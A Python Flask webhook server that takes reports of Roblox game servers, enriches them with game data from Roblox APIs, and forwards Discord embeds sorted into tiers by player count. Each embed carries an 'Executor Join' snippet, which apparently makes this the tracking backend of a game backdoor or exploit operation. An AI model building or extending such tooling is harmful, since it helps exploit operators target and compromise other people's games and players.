import os, hashlib, time, requests, logging
from flask import Flask, request, jsonify

app = Flask(__name__)
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger("LuminarProject")

AUTH_SECRET = os.environ.get('AUTH_SECRET')
WEBHOOKS = {
    "tier1": os.environ.get('WEBHOOK_0_50'),
    "tier2": os.environ.get('WEBHOOK_50_100'),
    "tier3": os.environ.get('WEBHOOK_100_500'),
    "tier4": os.environ.get('WEBHOOK_INFINITY')
}

def verify_luminar_security(provided_hash):
    current_min = time.gmtime().tm_min
    minutes = [current_min, (current_min - 1) % 60, (current_min - 2) % 60]
    for m in minutes:
        if provided_hash == hashlib.sha256(f"{AUTH_SECRET}:{m}".encode()).hexdigest():
            return True
    return False

@app.route('/webhook', methods=['POST'])
def handle_webhook():
    data = request.json
    provided_hash = request.headers.get('X-Luminar-Auth')
    
    if not verify_luminar_security(provided_hash):
        return jsonify({"error": "Unauthorized"}), 401

    try:
        place_id = data.get('placeId')
        job_id = data.get('jobId') if data.get('jobId') != "" else "Studio_Session"
        
        # 1. Fetch Universe ID
        u_res = requests.get(f"https://apis.roblox.com/universes/v1/places/{place_id}/universe").json()
        u_id = u_res.get('universeId')

        if not u_id:
            logger.warning(f"⚠️ Could not find Universe ID for Place {place_id}. Using fallback.")
            # Fallback data if game is private/studio
            g_name, active, creator, icon, thumb = "Unknown Game (Private)", 0, "Unknown", "", ""
        else:
            # 2. Fetch Game Info Safely
            g_data = requests.get(f"https://games.roblox.com/v1/games?universeIds={u_id}").json().get('data', [])
            v_data = requests.get(f"https://games.roblox.com/v1/games/votes?universeIds={u_id}").json().get('data', [])
            
            if g_data:
                g_info = g_data[0]
                g_name = g_info.get('name', 'Luminar Experience')
                active = g_info.get('playing', 0)
                creator = g_info.get('creator', {}).get('name', 'N/A')
            else:
                g_name, active, creator = "Private Experience", 0, "N/A"

            # 3. Fetch Thumbnail Safely
            icon_res = requests.get(f"https://thumbnails.roblox.com/v1/games/icons?universeIds={u_id}&size=256x256&format=Png").json().get('data', [])
            icon = icon_res[0].get('imageUrl', '') if icon_res else ""
            
            thumb_res = requests.get(f"https://thumbnails.roblox.com/v1/games/multiget/thumbnails?universeIds={u_id}&size=768x432&format=Png").json().get('data', [])
            thumb = thumb_res[0]['thumbnails'][0].get('imageUrl', '') if (thumb_res and thumb_res[0].get('thumbnails')) else ""

        # Routing
        if active >= 500: target = WEBHOOKS["tier4"]
        elif active >= 100: target = WEBHOOKS["tier3"]
        elif active >= 50: target = WEBHOOKS["tier2"]
        else: target = WEBHOOKS["tier1"]

        payload = {
            "embeds": [{
                "author": {"name": "Luminar Intelligence", "icon_url": icon},
                "title": f"🚀 Server Log: {g_name}",
                "color": 0xAC00FF,
                "image": {"url": thumb},
                "thumbnail": {"url": icon},
                "fields": [
                    {"name": "👥 Population", "value": f"**Total Active:** {active:,}\n**Server:** {data['playerCount']}/{data['maxPlayers']}", "inline": True},
                    {"name": "👑 Creator", "value": f"`{creator}`", "inline": True},
                    {"name": "💻 Executor Join", "value": f"```js\nRoblox.GameLauncher.joinGameInstance({place_id}, '{job_id}');\n```", "inline": False}
                ],
                "footer": {"text": f"JobID: {job_id} | Luminar Security"}
            }]
        }

        requests.post(target, json=payload)
        return jsonify({"status": "Success"}), 200

    except Exception as e:
        logger.error(f"❌ Error: {str(e)}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 10000)))
